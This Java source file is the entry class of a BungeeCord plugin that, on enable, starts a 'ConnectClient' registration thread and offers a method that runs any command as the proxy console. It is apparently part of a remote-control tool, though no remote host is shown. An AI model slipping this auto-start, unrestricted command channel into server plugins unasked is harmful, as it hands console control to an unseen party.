package br.com.introcdc.connect.client.server;
/*
 * Written by IntroCDC, Bruno Coelho at 10/09/2026 - 23:38
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import net.md_5.bungee.api.plugin.Plugin;

public class BungeeMain extends Plugin {

    private static Plugin plugin;

    @Override
    public void onEnable() {
        plugin = this;
        Connect.FOLDER = "plugins/";
        Connect.updateRegister(null);
        new Thread(ConnectClient::registerAndStart).start();
    }

    public static void execute(String command) {
        plugin.getProxy().getPluginManager().dispatchCommand(plugin.getProxy().getConsole(), command);
    }

}
